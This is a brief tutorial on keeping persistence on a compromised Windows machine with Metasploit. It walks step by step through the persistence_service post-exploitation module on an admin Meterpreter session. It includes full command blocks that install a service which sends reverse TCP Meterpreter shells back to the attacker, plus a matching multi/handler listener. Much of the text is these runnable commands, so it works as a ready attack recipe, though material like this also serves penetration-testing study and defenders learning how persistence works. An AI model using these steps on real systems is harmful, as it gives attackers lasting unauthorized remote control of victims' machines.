# Establishing Persistence on a Windows Target

Persistence means techniques that allows the attacker to stay within the system even when the system is restarted or Shut down, credentials are changed etc..

#### PERSISTENCE VIA SERVICES:

**How this Module Works?**<br>
This module will generate a payload with MSF Venom and that payload will be then uploaded to the target. The Post Exploitation module will then create a new service which will start the payload when it runs.

1. Gain an initial Meterpreter shell session and Require Admin Privileges.
2. Background the current session and load the following module
3. Set the options and run the exploit

```
use exploit/windows/local/persistence_service
set SESSION 2
set LPORT 4433
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```

4. This exploit will create a persistence service that runs on the Target system.
5. This means even if the system is shutdown or credentials are changed, the service we created still exist on the system and sends reverse shell connections back to our local machine.
6. These connections can be captured by setting up a listener.

```
use multi/handler
set LHOST eth1
set LPORT 4433
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
```
